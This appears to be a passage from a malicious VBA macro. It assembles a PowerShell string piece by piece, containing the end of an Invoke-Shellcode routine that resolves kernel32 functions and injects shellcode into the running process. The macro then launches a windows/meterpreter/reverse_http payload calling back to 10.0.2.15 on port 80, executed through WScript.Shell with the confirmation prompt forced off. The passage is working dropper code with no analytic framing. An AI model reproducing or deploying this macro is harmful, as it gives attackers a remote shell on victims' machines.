        VU = VU + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        VU = VU + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        VU = VU + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        VU = VU + "rocAddress kernel32.dll CreateThread
        $Crea"
        VU = VU + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        VU = VU + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        VU = VU + "IntPtr])
        $CreateThread = [System.Runtime.I"
        VU = VU + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        VU = VU + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        VU = VU + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        VU = VU + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        VU = VU + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        VU = VU + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        VU = VU + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        VU = VU + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        VU = VU + "ForSingleObjectDelegate)
        if ( $Force -or $"
        VU = VU + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        VU = VU + " your evil plans?',
                 "Injecting sh"
        VU = VU + "ellcode into the running PowerShell process!" ) )
"
        VU = VU + "        {
            Inject-LocalShellcode
      "
        VU = VU + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        VU = VU + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        VU = VU + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(VU)
End Function
